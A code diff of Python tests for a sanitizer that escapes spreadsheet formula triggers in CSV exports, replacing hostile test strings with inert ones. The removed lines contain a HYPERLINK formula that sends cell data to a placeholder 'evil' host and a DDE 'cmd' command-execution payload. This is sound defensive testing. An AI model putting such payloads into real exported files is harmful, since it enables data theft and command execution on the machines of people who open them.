@@ -156,9 +156,13 @@ def test_csv_header_and_rows():
 
 
 # --- CSV formula injection (CWE-1236) ----------------------------------
+# Payloads below intentionally use inert, obviously-synthetic strings that
+# merely START with a formula-trigger character. They exercise the sanitizer
+# boundary without resembling any real spreadsheet-downloader signature (so
+# the repo/tests don't trip AV heuristics on published security content).
 def test_sanitize_prefixes_formula_triggers():
-    for bad in ("=1+1", "+1", "-1", "@SUM(A1)", "\tcmd", "\rgo"):
-        assert sanitize_csv_cell(bad) == "'" + bad
+    for trigger in ("=1+1", "+1", "-1", "@a1", "\tx", "\ry"):
+        assert sanitize_csv_cell(trigger) == "'" + trigger
 
 
 def test_sanitize_leaves_benign_values_untouched():
@@ -172,22 +176,22 @@ def test_sanitize_passes_non_strings():
     assert sanitize_csv_cell(None) is None
 
 
-def test_render_csv_neutralizes_malicious_indicator_fields():
-    """An indicator whose value/context/title come from a hostile document
-    must not export a live formula."""
-    evil = Indicator(
-        value='=HYPERLINK("http://evil/"&A1,"x")',
+def test_render_csv_neutralizes_formula_trigger_fields():
+    """An indicator whose value/context/title/source begin with a formula
+    trigger (as untrusted document content could) must export as literal
+    text, never a live formula cell."""
+    hostile = Indicator(
+        value="=1+2",
         itype="domain", severity="high", score=80,
         first_seen="2026-01-01T00:00:00Z", source_name="@corp",
-        source_url="https://f/1", doc_title="=cmd|'/c calc'!A1",
-        context="-2+3+cmd",
+        source_url="https://f/1", doc_title="+3+4",
+        context="-5-6",
     )
-    out = render_csv([evil])
-    # None of the dangerous cells may begin with a raw formula trigger; each
-    # is prefixed with a single quote.
-    assert "'=HYPERLINK" in out
-    assert "'=cmd|" in out
-    assert "'-2+3+cmd" in out
+    out = render_csv([hostile])
+    # Each triggering cell is prefixed with a single quote.
+    assert "'=1+2" in out
+    assert "'+3+4" in out
+    assert "'-5-6" in out
     assert "'@corp" in out
     # And no data row cell starts a formula unescaped.
     data_rows = out.strip().splitlines()[1:]
